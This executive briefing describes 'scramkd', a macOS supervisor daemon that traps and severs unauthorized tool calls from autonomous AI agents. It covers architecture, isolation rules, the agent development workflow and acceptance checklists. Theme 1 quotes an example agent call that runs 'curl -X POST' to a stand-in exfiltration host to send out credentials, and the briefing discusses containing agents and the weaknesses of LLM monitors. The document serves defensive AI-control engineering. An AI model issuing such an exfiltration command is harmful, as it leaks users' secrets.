# Executive Briefing: SCRAMKD Darwin Supervisor Daemon & Hardware Interlock System Architecture

## Executive Summary

The **SCRAMKD** system (formerly *Tactical Hypervisor*) is a high-assurance, hardware-grade safety interlock and supervisor daemon designed for macOS 14+ (XNU Darwin) operating in Swift 6 language mode with complete strict concurrency. The core purpose of `scramkd` is to provide **deterministic process severance and hardware-level containment** for autonomous AI agent runtimes operating via Model Context Protocol (MCP) and Agent-to-Agent (A2A) communications. 

Unlike conventional AI safety frameworks that rely on soft conversational guardrails, prompt classifiers, or secondary language model monitors—methods vulnerable to jailbreaks, context drift, and latency overhead—`scramkd` enforces deterministic, non-probabilistic safety at the POSIX and Mach kernel boundaries. Upon detecting an unauthorized tool call or unapproved egress attempt (such as an untrusted tool invocation or command exfiltration), `scramkd` executes a circuit severance with **sub-384 microsecond (<384 µs) trip latency**, trapping high-risk operations before host or network compromise can occur.

The project is governed by a **Dual Protocol Paradigm (A2A v1.0 + MCP)** under an autonomous **Maker-Breaker Multi-Agent Orchestration Model**. Development is strictly constrained to a zero-trust, air-gapped security posture where live startup states remain locked, detached, and output-audio disabled until explicitly authorized through single-use hardware leases (`PermissivePermit`) or physical keycaps (`<SPACE>` for single-dispatch permissive grant, `<ESC>` for emergency hardware SCRAM).

---

## Architectural & Governance Framework Overview

```
                                  +-------------------------------------------------------+
                                  |            SCRAMKD SUPERVISOR DAEMON                  |
                                  |  (macOS 14 / Swift 6 Complete Strict Concurrency)     |
                                  +---------------------------+---------------------------+
                                                              |
                 +--------------------------------------------+--------------------------------------------+
                 |                                            |                                            |
                 v                                            v                                            v
+---------------------------------+          +---------------------------------+          +---------------------------------+
|           ScramKCore            |          |       ScramKVirtualization      |          |           ScramKAudio           |
| Pure Swift / Foundation         |          | Transport & Container Isolation |          | CoreAudio / AVFoundation        |
| - HardwareInterlockGate         |          | - ContainerSocketBridge         |          | - ScramKToneSynthesizer         |
| - Single-Use PermissivePermit   |          | - ContainerSecurityProfile      |          | - CScramKAudioRealtime (C11)    |
| - ActiveHoldPolicy              |          | - MCPProcessTransport (7-Env)   |          | - SVSBridge Cursor Monitoring   |
| - OSAllocatedUnfairLock Mutex   |          | - SHA-256 Constant-Time Approval|          | - Zero-Lock Realtime Render     |
+---------------------------------+          +---------------------------------+          +---------------------------------+
                 |                                            |                                            |
                 +--------------------------------------------+--------------------------------------------+
                                                              |
                                                              v
                                             +---------------------------------+
                                             |            ScramKUI             |
                                             | AppKit / SwiftUI / Metal HUD    |
                                             | - 1440x900 Fixed Logical Canvas |
                                             | - Display P3 Presentation       |
                                             | - 3-Tier Disclosure HUD         |
                                             | - ZERO WKWebView Allowed        |
                                             +---------------------------------+
```

### Component Responsibility Matrix

| Package / Target Module | Primary Responsibility | Framework & Toolchain Dependencies | Key Constraints & Rules |
| :--- | :--- | :--- | :--- |
| **`ScramKCore`** | Core state machine, synchronization primitives, lock management, lease arbitration. | Pure Swift, Foundation, `os.lock`. | Zero UI, audio, or virtualization dependencies. Owns `OSAllocatedUnfairLock` non-suspending sections. |
| **`ScramKVirtualization`** | Process transport, container socket bridging, MCP framing, environment scrubbing. | `ScramKCore`, Foundation. | Zero UI dependencies. Enforces 127.0.0.1 loopback restrictions and 7-key subprocess environment scrubbing. |
| **`ScramKAudio`** | Tactical tone synthesis, realtime cue generation, SVS bridge monitoring. | `ScramKCore`, AVFoundation, CoreAudio, `CScramKAudioRealtime`. | Realtime output target (`CScramKAudioRealtime`) uses C11 atomics. Zero locks, allocations, or Tasks in render thread. Preserves on-device `LocalVoiceCommander` without enabling new microphone input or automatic PTT. |
| **`ScramKUI`** | Operator console, 3-tier HUD, Metal viewport, safety cockpit controls. | `ScramKCore`, `ScramKVirtualization`, AppKit, SwiftUI, Metal, MetalKit. | Bound strictly to `@MainActor`. Prohibits `WKWebView`. Enforces Display P3 color space and JetBrains Mono typography. |
| **`scramkd`** | Executable composition root for daemon subsystem, window lifecycle, and input routing. | Links all library modules. | SwiftPM-compatible entrypoint. One functional control chrome (`SCRAMKD // SUPERVISOR DAEMON`). |
| **`scramkctl`** | Operator Command Line Interface executable (`status`, `grant`, `abort`). | Linked against `ScramKCore`. | Direct terminal operator dispatch and interlock status queries. |

---

## Detailed Analysis of Key Themes

### Theme 1: Deterministic Circuit Severance vs. Probabilistic Guardrails

Traditional runtime protection for autonomous AI agents attempts to filter outputs using secondary LLM inspectors, regex pattern matchers, or semantic classifiers. The source context underscores that when autonomous agents dispatch shell commands or access filesystem paths, **probabilistic mediation is inherently flawed**.

`scramkd` introduces an architectural model based on **Deterministic POSIX Kernel Mediation & Lease Arbitration**. The containment flow executes across three distinct isolation chambers:

1. **Chamber 01: Untrusted Agent Ingress (MCP Call)**
   - The agent environment emits a JSON-RPC dispatch (e.g., `screenenv.bash_execute` requesting an unauthorized egress command like `curl -X POST https://exfil.endpoint/creds`).
   - The unprivileged file descriptor is trapped at the host `stdio` interface via POSIX signals (`SIGILL` / `POSIX_TRAP`).
2. **Chamber 02: ScramK Hardware Interlock Gate (Swift 6 Actor)**
   - Managed by the `HardwareInterlockGate` actor utilizing `OSAllocatedUnfairLock` synchronous critical sections.
   - The gate functions like a physical 16mm dielectric air-gap knife switch.
   - Continuations (`ContinuationWaiter`) remain suspended in a locked state until an explicit operator intervention occurs via keycap bindings (`<SPACE>` or `<ESC>`).
3. **Chamber 03: Detonation Container Runtime (`screenenv`)**
   - Sandboxed Docker runtime (`amhma/ubuntu-desktop:22.04-0.1.0`) connected via an isolated `stdio` pipe (`F_SETNOSIGPIPE`).
   - Network egress is set to zero allocated ports (`strictAirgap`). Execution is blocked without a single-use leased file descriptor.

```
[ UNTRUSTED MCP INBOUND ] ---> ( Chamber 01: POSIX Trap )
                                         |
                                         v
                         ( Chamber 02: Hardware Interlock )
                         | - 16mm Dielectric Air Gap      |
                         | - Waiter Pool Suspended (1/1)  |
                         +--------------------------------+
                                   /            \
                [ <SPACE> Grant ] /              \ [ <ESC> Scram ]
                                 v                v
                       ( Single-Use Lease )   ( POSIX SIGKILL )
                                 |                |
                                 v                v
                       ( Chamber 03 Exec )   ( Atomic Purge )
```

---

### Theme 2: Strict Swift 6 Concurrency & Actor Isolation Topology

`scramkd` is engineered for strict compilation under the Swift 6 language mode (`-strict-concurrency=complete`). Isolation rules prevent data races and ensure thread safety across high-concurrency event loops:

* **Actor-Owned State:** Shared safety and transport state are owned exclusively by Swift actors (`HardwareInterlockGate`, `ContainerSocketBridge`, `AudioGraphOwner`).
* **MainActor Hierarchy:** AppKit, SwiftUI views, window controllers, and presentation states are pinned strictly to `@MainActor`.
* **Cross-Isolation Requirements:** Any value traversing actor boundaries must conform to `Sendable`. Unjustified `@unchecked Sendable` or `nonisolated(unsafe)` bypasses are strictly prohibited across the codebase.
* **Locking Invariants:** `OSAllocatedUnfairLock` is restricted to non-suspending, synchronous critical sections (such as atomic continuation resolution in `ContinuationWaiter` and `OneShotGate`). **Holding an unfair lock across an `await` point or replacing actor isolation with locks is forbidden.**

```
+-----------------------------------------------------------------------------------+
|                            SWIFT 6 ISOLATION TOPOLOGY                             |
+-----------------------------------------------------------------------------------+
|  @MainActor Layer                                                                 |
|  - AppKit / SwiftUI Console Hierarchy (ScramKConsoleView, ConsoleSafetyCockpit)   |
|  - Metal Viewport Container (ScramKMetalViewportContainer)                        |
|                                                                                   |
|  Sendable Boundary (Cross-Isolation Value Transfers)                              |
|  ==============================================================================   |
|                                                                                   |
|  Actor-Isolated Safety & State Layer                                              |
|  - TacticalCore / ScramKCore Actors (HardwareInterlockGate)                       |
|  - TacticalVirtualization / ScramKVirtualization Actors (ContainerSocketBridge)   |
|  - TacticalAudioSVS / ScramKAudio Actors (AudioGraphOwner, AudioReclamationControl)|
|                                                                                   |
|  Synchronous Non-Suspending Mutex Layer                                           |
|  - OSAllocatedUnfairLock (ContinuationWaiter, OneShotGate, AudioWaitSignal)       |
|  - MUST NEVER hold lock across an await point                                     |
+-----------------------------------------------------------------------------------+
```

---

### Theme 3: Real-Time Audio Synthesizer Engine & Lock-Free C11 Atomics

The audio subsystem (`ScramKAudio`) works in conjunction with a dedicated lock-free C11 realtime engine (`CScramKAudioRealtime`) to deliver audio feedback for critical system states without compromising host execution stability.

#### Realtime Engine Architecture Rules
* **Zero-Allocation Callback:** The C11 render callback (`tart_render`) operates within the OS realtime audio thread. It performs **zero heap allocations, zero lock acquisitions, zero File I/O, zero Task creations, and zero Swift/UI callbacks**.
* **C11 Atomic Synchronization:** State switches and gain ramps are published through atomic primitives (`tart_atomics_are_lock_free`).
* **Quiescent Destruction & Quarantine:** C storage memory cannot be freed by Swift's `deinit`. Swift handles hold an `AudioRawAddress` pointer. Destruction occurs exclusively through `AudioReclamationControl` on the control actor after proving both producer detachment (`tart_mark_producer_detached`) and callback retirement (`tart_mark_callback_retired`).
* **Catalog Tone Profile Specification:**

| Tone Cue | Frequency A (Hz) | Frequency B (Hz) | Segment Frames | Segment Count | Peak Amplitude | Waveform | Audio Priority |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| `armedPulse` | 440 Hz | 440 Hz | 7,200 | 1 | 0.501187234 | Sine | 1 |
| `permissivePulse` | 880 Hz | 880 Hz | 9,600 | 1 | 0.630957344 | Sine | 1 |
| `emergencyAbortTrip` | 1200 Hz | 1200 Hz | 24,000 | 1 | 0.891250938 | Sawtooth | 4 (Highest) |
| `masterCaution` | 660 Hz | 880 Hz | 12,000 | 2 | 0.501187234 | Sine | 2 |
| `masterWarning` | 880 Hz | 660 Hz | 6,000 | 8 | 0.630957344 | Sine | 3 |
| `altitudeAlert` | 500 Hz | 500 Hz | N/A | 1 | 0.600000000 | Sine | 1 |
| `terrainProximity` | 1000 Hz | 1000 Hz | N/A | 1 | 0.900000000 | Sawtooth | 1 |
| `ping` | 880 Hz | 880 Hz | N/A | 1 | 0.400000000 | Sine | 1 |

---

### Theme 4: Zero-Trust Network & Virtualization Transport

Security rules for `ScramKVirtualization` and `ContainerSocketBridge` mandate complete containment of external subprocesses:

1. **Loopback Binding Isolation:** Sockets and framebuffer transports are restricted exclusively to literal loopback endpoints (`127.0.0.1:7860`). Proxies, HTTP redirects, and external non-loopback destinations are rejected.
2. **Subprocess Environment Scrubbing:** The `MCPProcessTransport` subsystem strips ambient environment variables, allowlisting exactly seven (7) essential key paths to prevent credential leakage to child subprocesses.
3. **Single-Use Request Clearance:** Authorization leases (`BridgeRequestLease`) are single-use (`PermissivePermit`). Request payloads are bound using constant-time SHA-256 hex comparison (`BridgeApprovalKey`).
4. **Data Transmission Safeguards:**
   - Transmissions are chunked into **16 KiB continuous stream buffers** using non-blocking writers (`MCPNonblockingWriter`).
   - The file descriptor flags enforce `F_SETNOSIGPIPE`.
   - Guest input forwarding (keyboard, pointer, clipboard) from guest containers is **disabled**.
   - Completing a chunk transmission without receiving a correlated response does **not** constitute execution success.

---

### Theme 5: Multi-Agent Maker-Breaker Workflows & Precision RAG Protocols

Development of `scramkd` follows an autonomous, multi-agent Maker-Breaker paradigm managed by the Sovereign Master Orchestrator:

```
+-----------------------------------------------------------------------------------+
|                        5-PHASE MAKER-BREAKER LOOP (MB-01..MB-07)                   |
+-----------------------------------------------------------------------------------+
|  Phase 1: Security Contract & Precision RAG Query                                 |
|  - Pre-task lookups via DO Precision RAG (http://127.0.0.1:8181/query)            |
|  - Security Architect boundary sign-off                                           |
|                                                                                   |
|  Phase 2: Adversarial Red Suite Construction                                      |
|  - Breaker agent writes deterministic failing XCTest cases in Tests/              |
|                                                                                   |
|  Phase 3: Maker Green Minimal Implementation                                      |
|  - Swift Maker implements minimal Swift 6 code fix                                |
|                                                                                   |
|  Phase 4: Mutation Survival Gate                                                  |
|  - Breaker inverts guard conditions to verify test failure, then restores fix      |
|                                                                                   |
|  Phase 5: Parallel Control-Plane Sync                                             |
|  - RAG Steward executes delta indexing via delta_sync_rag.py                     |
|  - Meta Observer logs lessons learned to META_OBSERVER_LEDGER.md                 |
+-----------------------------------------------------------------------------------+
```

#### Specialized Subagent Roster

* **`scramkd-rebrand-architect`**: Manages target, module, symbol, C11 header, and configuration migrations.
* **`tactical-swift-maker`**: System, security, and audio implementer (`ScramKCore`, `ScramKVirtualization`, `ScramKAudio`).
* **`tactical-stitch-designer`**: Native SwiftUI/Metal HUD builder (`ScramKUI`).
* **`tactical-security-architect`**: Read-only reviewer of authorization, boundaries, and entitlements (`EnableWriteTools: false`).
* **`tactical-breaker`**: Adversarial Red Team agent executing TOCTOU, race condition, and mutation survival tests.
* **`tactical-verification-engineer`**: System build gatekeeper executing strictly serialized SwiftPM compilation and test suites.
* **`tactical-meta-observer`**: Parallel steward auditing skills, manifests, and system ledgers.
* **`tactical-rag-steward`**: Manages out-of-band SHA-256 delta indexing against the local Precision Code RAG service (`127.0.0.1:8181`).

---

### Theme 6: Human-in-the-Loop Interlock & 3-Tier Progressive Disclosure HUD Design

The UI architecture in `ScramKUI` implements a high-density, tactical avionics display modeled after military specification standards (MIL-STD-1472H):

* **Exact Logical Geometry:** 1440x900 logical-point content canvas divided into strict structural grids:
  - **Vertical Tier Dimensions:** Top Rail (44pt) / Center Canvas (580pt) / Bottom Dock (276pt).
  - **Horizontal Panel Dimensions:** Left Rail (160pt) / Center Viewport (nominally 794pt) / Cockpit Panel (486pt).
* **Color Space & Styling:** High-contrast Display P3 presentation pipeline. HTML hex values convert directly into P3. Surfaces feature 0-radius structural corners, 1pt hairline borders (`#1C2636`), obsidian background fills (`#0A0E14` / `#0D1219` / `#111822`), and 2pt keycap corners.
* **Prohibited Components:** Embedded web views (**`WKWebView` is completely prohibited**).
* **Keycap Event Parity:** Physical keyboard keys share exact handler logic with UI controls:
  - `<SPACE>`: Grants a single-use permissive lease (`grantPermissive`).
  - `<ESC>`: Triggers an immediate emergency hardware SCRAM (`tripEmergencyAbort`).
  - `<F12>`: Invokes verified disconnect/reseed operations or explicitly reports `NOT IMPLEMENTED` (never silently mapped to abort).

---

## Important Quotes & Architectural Context

### 1. Verification Philosophy
> *"Avionics brevity, zero chat/AI tropes, and no conversational filler in UI, code, commits, or reports. Report evidence, limitations, failures, and skips directly. Code written ≠ Problem solved."*

* **Context:** Found in `AGENTS.md §1` and `ANTIGRAVITY_PROMPT.md §1`. This directive dictates that code compilation alone does not equal correctness. Every state transition requires explicit, deterministic test evidence, metric reports, and mutation survival checks.

### 2. Operational Safety Posture
> *"When an agent runs in production, 'hope' is not an isolation policy. SCRAMKD replaces heuristic mediation with physical certainty... Live startup remains locked, detached, and output audio disabled."*

* **Context:** Excerpted from marketing launch copy (`Brand Asset 04`) and `AGENTS.md §4`. It reinforces that `scramkd` treats autonomous AI agent runtimes as untrusted environments. System default startup states must remain completely locked, air-gapped, and silent until explicit operator intervention occurs.

### 3. Absolute Capability Limits & Honesty
> *"F12 invokes verified disconnect/reseed operations or reports NOT IMPLEMENTED; do not silently substitute abort. Gate abort does not prove container destruction or cancellation of in-flight I/O. Never fabricate kill, detach, revoke, reseed, or execution-success outcomes."*

* **Context:** Sourced from `AGENTS.md §4` ("Capability limits"). It forbids subagents or system layers from fabricating execution success or masking unfulfilled actions. Unimplemented features must explicitly report `NOT IMPLEMENTED`.

### 4. Zero-Trust Security Invariant
> *"Do not infer App Sandbox, guest destruction, airgap enforcement, or physical-human authenticity from UI labels, local NSEvent delivery, or an actor transition."*

* **Context:** Stated in `AGENTS.md §3` under the Security Architect role. System security boundaries cannot rely on visual UI cues, front-end state, or unverified event delivery. Every claim must be backed by OS-verified peer identities and cryptographically checked payload signatures.

### 5. Real-Time Render Callback Boundary
> *"No locks, allocation, I/O, Tasks, actor/UI calls, or unbounded work in the render callback (CScramKAudioRealtime). Any C11/FFI boundary requires reviewed ownership, lock-free publication, and quiescent destruction."*

* **Context:** Sourced from `AGENTS.md §4A` and `AudioRealtimeStorage.swift`. This rule enforces strict isolation between the C11 real-time audio thread and the Swift actor system, eliminating potential audio glitches or deadlocks.

---

## Actionable Insights & Implementation Directives

### 1. Work Unit Milestone Schedule (MB-00 .. MB-08)

Developers and subagents working on the repository must execute tasks according to the following work unit sequence:

```
MB-00: Target & Namespace Cutover (Tactical* -> ScramK* / scramkd)
  │
  ├── MB-01: VULN-01 Single-Use PermissivePermit in HardwareInterlockGate
  │
  ├── MB-02: VULN-02/03 ContainerSecurityProfile & AST JSON Policy
  │
  ├── MB-03: VULN-04 Writer Queue Cancellation Deadlock Fix (OneShotGate)
  │
  ├── MB-04: VULN-05 Subprocess Environment Scrubbing (7-Key Allowlist)
  │
  ├── MB-05: VULN-06 Constant-Time SHA-256 Digest Approval Comparison
  │
  ├── MB-06: ActiveHoldPolicy Freeze & Visual/Audio Intercept Alerting
  │
  ├── MB-07: Native SwiftUI 3-Tier Progressive Disclosure HUD (1440x900 P3)
  │
  └── MB-08: scramkctl CLI, LaunchDaemon plist & Normative Docs Sync
```

* **MB-00 (Target & Namespace Cutover):** Atomic rename and `Package.swift` update from `Tactical*` to `scramkd`, `ScramKCore`, `ScramKVirtualization`, `ScramKAudio`, `CScramKAudioRealtime`, `ScramKUI`, and corresponding test suites, verifying full baseline passage (356 tests).
* **MB-01 (Single-Use Lease Gate):** Enforce single-use request-bound `PermissivePermit` clearance in `HardwareInterlockGate` and `ContainerSocketBridge`.
* **MB-02 (Container Security & AST Inspection):** Implement explicit `ContainerSecurityProfile` (`strictAirgap` vs `loopbackFramebuffer`) and JSON AST policy validation.
* **MB-03 (Writer Deadlock Remediation):** Resolve writer queue cancellation deadlocks in `OneShotGate.finish` and `releaseWriter` loops.
* **MB-04 (Environment Scrubbing):** Apply 7-key environment variable allowlisting in `MCPProcessTransport`.
* **MB-05 (Constant-Time Verification):** Mandate constant-time SHA-256 hex comparison in `ContainerSocketBridge.approve(_:)`.
* **MB-06 (Active Hold & Dual Alerts):** Implement `ActiveHoldPolicy` countdown freeze and synchronized audio/visual strobing.
* **MB-07 (Native HUD):** Construct the native 1440x900 Display P3 SwiftUI console HUD with 0-radius surfaces and JetBrains Mono typography.
* **MB-08 (CLI & Daemon Integration):** Finalize `scramkctl` operator CLI (`status`, `grant`, `abort`), `LaunchDaemons/com.scramk.daemon.plist`, and system documentation.

---

### 2. Pre-Task Precision RAG Protocol Checklist

Before modifying any existing actor transitions, C11 header files, or UI tokens, subagents **must** query the local Precision Code RAG service:

```bash
curl -sS -X POST http://127.0.0.1:8181/query \
  -H "Content-Type: application/json" \
  -d '{"query": "<symbol, state transition, or token name>", "repo": "tactical-hypervisor-macos", "top_k": 4, "candidate_k": 20}'
```

After modifying code files, the `tactical-rag-steward` subagent must update the index by executing:

```bash
python3 .agents/skills/do-precision-rag-steward/scripts/delta_sync_rag.py
```

---

### 3. Mandatory Serialized Release Gate

Final acceptance and build verification **must** be executed sequentially from the repository root using SwiftPM in release mode with complete strict concurrency enabled:

```sh
# 1. Clean release compilation with complete strict concurrency
swift build -c release -Xswiftc -strict-concurrency=complete

# 2. Run deterministic XCTest suite (skipping live physical socket handshake test)
swift test -Xswiftc -strict-concurrency=complete --skip 'ContainerSocketBridgeTests.testLiveContainerHandshakeUnderPermissiveGateState'

# 3. Verify operator CLI execution status
swift run -Xswiftc -strict-concurrency=complete scramkctl status

# 4. Execute daemon startup check
swift run -Xswiftc -strict-concurrency=complete scramkd
```

---

### 4. Visual & Hardware Acceptance Criteria Checklist

* [ ] **Geometry Verification:** Native UI fits the 1440x900 logical canvas (tiers 44/580/276; rail 160, center 794, cockpit 486) without clipping or duplicate chrome.
* [ ] **Color Management:** Display P3 color presentation pipeline verified with dark obsidian backgrounds (`#0A0E14`), high-contrast amber warnings (`#F59E0B`), and radical red SCRAM indicators (`#EF4444`).
* [ ] **Typography & Styling:** JetBrains Mono font utilized for tabular metrics; 0pt structural corners and 2pt keycap corners maintained.
* [ ] **Zero Web View Enforcement:** Zero imports or instances of `WKWebView` exist in `ScramKUI`.
* [ ] **Input Parity:** Keyboard events (`<SPACE>`, `<ESC>`, `<F12>`) mirror physical button click handlers without queuing delays or duplicate dispatches.
* [ ] **Concurrency Compliance:** Zero warnings reported under `-strict-concurrency=complete`. No unfair locks held across `await` points.
* [ ] **Audio Quiescence:** Realtime C11 render callback (`tart_render`) remains free of locks, heap allocations, and Swift task invocations. Reclaimed audio handles pass `AudioReclamationControl` quarantine verification.